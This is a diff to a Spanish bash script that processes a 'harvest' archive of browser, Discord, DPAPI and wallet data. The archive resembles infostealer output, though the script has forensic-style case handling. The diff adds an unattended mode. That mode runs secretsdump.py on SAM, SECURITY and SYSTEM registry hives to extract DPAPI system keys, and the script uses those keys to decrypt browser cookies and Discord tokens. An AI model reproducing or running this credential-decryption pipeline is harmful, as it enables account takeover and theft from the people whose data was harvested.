@@ -16,6 +16,8 @@ Opciones:
   --clean         borra work/ y decrypted/ tras verificar el archivo cifrado
   --prune         borra raw/ tras verificar el archivo cifrado
   --force         reutiliza work/ y decrypted/ existentes, sobrescribe el .7z
+  --auto          sin preguntas: genera/guarda la contraseña del .7z y saca
+                  dpapi_machinekey/userkey de los hives automáticamente
   --win-password  contraseña de Windows para blobs DPAPI antiguos o token
   --machinekey    DPAPI_SYSTEM machinekey en hex para v20 sin ABE
   --system-userkey DPAPI_SYSTEM userkey en hex (abre S-1-5-18/User)
@@ -44,6 +46,7 @@ need() {
 CLEAN=0
 PRUNE=0
 FORCE=0
+AUTO=0
 CASE=""
 WIN_PASSWORD=""
 MACHINEKEY=""
@@ -56,6 +59,7 @@ while (($#)); do
 		--no-clean) CLEAN=0 ;;
 		--prune) PRUNE=1 ;;
 		--force) FORCE=1 ;;
+		--auto) AUTO=1 ;;
 		--win-password) [[ $# -ge 2 ]] || die "--win-password necesita valor"; WIN_PASSWORD=$2; shift ;;
 		--machinekey) [[ $# -ge 2 ]] || die "--machinekey necesita valor"; MACHINEKEY=$2; shift ;;
 		--system-userkey) [[ $# -ge 2 ]] || die "--system-userkey necesita valor"; SYSTEM_USERKEY=$2; shift ;;
@@ -148,13 +152,17 @@ for zip in "${ZIPS[@]}"; do
 done
 
 mapfile -t SYNCS < <(find "$RAW" -maxdepth 1 -type f -name 'sync-*.zip' -print | sort)
-[[ ${#SYNCS[@]} -gt 0 ]] || die "falta el harvest principal sync-*.zip"
-SYNC=$(ls -1t "${SYNCS[@]}" | head -n 1)
-if [[ ${#SYNCS[@]} -gt 1 ]]; then
-	warn "hay ${#SYNCS[@]} sync-*.zip; uso el más reciente: $(basename "$SYNC")"
+SYNC=""
+if [[ ${#SYNCS[@]} -gt 0 ]]; then
+	SYNC=$(ls -1t "${SYNCS[@]}" | head -n 1)
+	[[ ${#SYNCS[@]} -gt 1 ]] && warn "hay ${#SYNCS[@]} sync-*.zip; uso el más reciente: $(basename "$SYNC")"
+	7z l -bd "$SYNC" | grep -qE '(browsers|discord|dpapi|wallets)/' \
+		|| die "el sync no parece un harvest (sin browsers/discord/dpapi/wallets)"
+else
+	compgen -G "$RAW/system-*.zip" >/dev/null \
+		|| die "falta el harvest principal sync-*.zip (y no hay hives system-*.zip)"
+	warn "no hay harvest principal; proceso solo los hives"
 fi
-7z l -bd "$SYNC" | grep -qE '(browsers|discord|dpapi|wallets)/' \
-	|| die "el sync no parece un harvest (sin browsers/discord/dpapi/wallets)"
 
 (
 	cd "$RAW"
@@ -224,6 +232,32 @@ if [[ -f "$WORK/discord/token.txt" ]]; then
 	fi
 fi
 
+# 4b. Hives: sacar DPAPI_SYSTEM sin pedir nada.
+if [[ -f "$WORK/hives/SAM.hiv" && -f "$WORK/hives/SECURITY.hiv" && -f "$WORK/hives/SYSTEM.hiv" ]]; then
+	echo "== Extrayendo DPAPI_SYSTEM de los hives"
+	SD=$(command -v secretsdump.py 2>/dev/null || true)
+	[[ -n "$SD" ]] || SD="$HOME/.local/bin/secretsdump.py"
+	if [[ -f "$SD" ]]; then
+		set +e
+		python3 "$SD" -sam "$WORK/hives/SAM.hiv" -security "$WORK/hives/SECURITY.hiv" \
+			-system "$WORK/hives/SYSTEM.hiv" LOCAL > "$CASE/secretsdump.txt" 2>&1
+		SD_CODE=$?
+		set -e
+		chmod 600 "$CASE/secretsdump.txt"
+		[[ -z "$MACHINEKEY" ]] && MACHINEKEY=$(sed -n 's/^dpapi_machinekey:0x//p' "$CASE/secretsdump.txt" | head -n 1)
+		[[ -z "$SYSTEM_USERKEY" ]] && SYSTEM_USERKEY=$(sed -n 's/^dpapi_userkey:0x//p' "$CASE/secretsdump.txt" | head -n 1)
+		if ((SD_CODE != 0)) || [[ -z "$MACHINEKEY" ]]; then
+			warn "secretsdump no dio la machinekey; revisa $CASE/secretsdump.txt"
+		else
+			echo "   dpapi_machinekey y dpapi_userkey obtenidas"
+		fi
+	else
+		warn "falta secretsdump.py (impacket); sigo sin claves de SYSTEM"
+	fi
+elif [[ -d "$WORK/hives" ]]; then
+	warn "hives incompletos (faltan SAM/SECURITY/SYSTEM); sigo sin claves de SYSTEM"
+fi
+
 # 5. Descifrar.
 echo "== Descifrando"
 mkdir -p "$DEC"
@@ -232,7 +266,11 @@ DECRYPT_ARGS=("$WORK" -o "$DEC" -q --no-color)
 [[ -n "$MACHINEKEY" ]] && DECRYPT_ARGS+=(--machinekey "$MACHINEKEY")
 [[ -n "$SYSTEM_USERKEY" ]] && DECRYPT_ARGS+=(--system-userkey "$SYSTEM_USERKEY")
 if [[ -z "$KSP" && -d "$WORK/hives/SystemKeys" ]]; then
-	KSP=$(find "$WORK/hives/SystemKeys" -maxdepth 1 -type f -iname '*chromekey*' -print -quit)
+	for candidate in "$WORK/hives/SystemKeys/Google Chromekey1" "$WORK/hives/SystemKeys/Google Chromekey2"; do
+		[[ -f "$candidate" ]] || continue
+		KSP=$candidate
+		break
+	done
 fi
 [[ -n "$KSP" ]] && DECRYPT_ARGS+=(--ksp "$KSP")
 if [[ -d "$WORK/hives/ProtectSystem" ]]; then
@@ -249,15 +287,21 @@ cat "$CASE/decrypt.log"
 COOKIES=$(awk '$1=="cookies"{print $2}' "$DEC/summary.txt")
 TOKENS=$(awk '$1=="tokens"{print $2}' "$DEC/summary.txt")
 echo "== Resultado: cookies=${COOKIES:-0} tokens=${TOKENS:-0}"
-[[ "${COOKIES:-0}" != "0" ]] || warn "0 cookies: revisa ABE y el fallback hives"
-[[ "${TOKENS:-0}" != "0" ]] || warn "0 tokens: revisa discord/token.txt y el raw"
+if [[ -n "$SYNC" ]]; then
+	[[ "${COOKIES:-0}" != "0" ]] || warn "0 cookies: revisa ABE y el fallback hives"
+	[[ "${TOKENS:-0}" != "0" ]] || warn "0 tokens: revisa discord/token.txt y el raw"
+fi
 
 # 6. Archivar cifrado y verificar.
 echo "== Archivando cifrado"
 if [[ -n "${CASE_PASSWORD:-}" ]]; then
 	PASSWORD=$CASE_PASSWORD
+elif [[ -s "$CASE/ARCHIVE_PASSWORD.txt" ]]; then
+	PASSWORD=$(head -n 1 "$CASE/ARCHIVE_PASSWORD.txt")
+elif ((AUTO)); then
+	PASSWORD=$(python3 -c 'import secrets; print(secrets.token_urlsafe(18))')
 else
-	[[ -t 0 ]] || die "define CASE_PASSWORD o ejecuta en una terminal"
+	[[ -t 0 ]] || die "define CASE_PASSWORD, usa --auto o ejecuta en una terminal"
 	read -rsp "Contraseña del archivo (no se muestra): " PASSWORD
 	echo
 	read -rsp "Repite la contraseña: " PASSWORD2
@@ -265,11 +309,18 @@ else
 	[[ "$PASSWORD" == "$PASSWORD2" ]] || die "las contraseñas no coinciden"
 fi
 [[ -n "$PASSWORD" ]] || die "contraseña vacía"
+if ((AUTO)); then
+	printf '%s\n' "$PASSWORD" > "$CASE/ARCHIVE_PASSWORD.txt"
+	chmod 600 "$CASE/ARCHIVE_PASSWORD.txt"
+	echo "   contraseña del archivo: $CASE/ARCHIVE_PASSWORD.txt"
+fi
 
 (
 	cd "$CASE"
+	EXTRA=()
+	[[ -f secretsdump.txt ]] && EXTRA+=(secretsdump.txt)
 	7z a -t7z -mhe=on -mx=9 -p"$PASSWORD" "$ARCHIVE" \
-		SHA256-raw.txt decrypt.log raw work decrypted >/dev/null
+		SHA256-raw.txt decrypt.log raw work decrypted "${EXTRA[@]}" >/dev/null
 )
 [[ -s "$ARCHIVE" ]] || die "no se creó el archivo"
 7z t -bd -p"$PASSWORD" "$ARCHIVE" >/dev/null || die "el archivo cifrado no verifica"
